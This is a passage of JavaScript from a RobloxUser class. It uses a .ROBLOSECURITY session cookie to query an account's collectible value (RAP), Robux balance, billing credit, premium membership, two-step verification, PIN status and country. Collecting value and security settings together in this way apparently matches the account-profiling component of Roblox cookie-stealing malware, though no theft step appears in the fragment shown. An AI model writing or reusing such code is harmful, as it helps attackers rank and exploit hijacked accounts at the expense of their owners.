...
class RobloxUser {
    ...
    async doAuthorizedRequest(url) {
        try { return (await axios.get(url, { headers: { Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}` } })).data; } catch { return null; }
    }
    ...
    async getAccountRAP(userId) {
        let rap = 0, cursor = "";
        try { do { const page = await this.doAuthorizedRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${cursor}`); if (!page?.data) break; rap += page.data.reduce((acc, item) => acc + (item.recentAveragePrice || 0), 0); cursor = page.nextPageCursor; } while (cursor); } catch { } return rap;
    }
    async getUserData() {
        const [creationData, premiumStatus, twoFAStatus, pinStatus, balanceData, countryData, creditData, rap, avatarUrl] = await Promise.all([
            this.doAuthorizedRequest(`https://users.roblox.com/v1/users/${this.userId}`), this.doAuthorizedRequest(`https://premiumfeatures.roblox.com/v1/users/${this.userId}/validate-membership`),
            this.doAuthorizedRequest(`https://twostepverification.roblox.com/v1/metadata`), this.doAuthorizedRequest(`https://auth.roblox.com/v1/account/pin`),
            this.doAuthorizedRequest(`https://economy.roblox.com/v1/users/${this.userId}/currency`), this.doAuthorizedRequest(`https://www.roblox.com/account/settings/account-country`),
            this.doAuthorizedRequest(`https://billing.roblox.com/v1/credit`), this.getAccountRAP(this.userId), this.getAccountBodyShot()]);
        return {
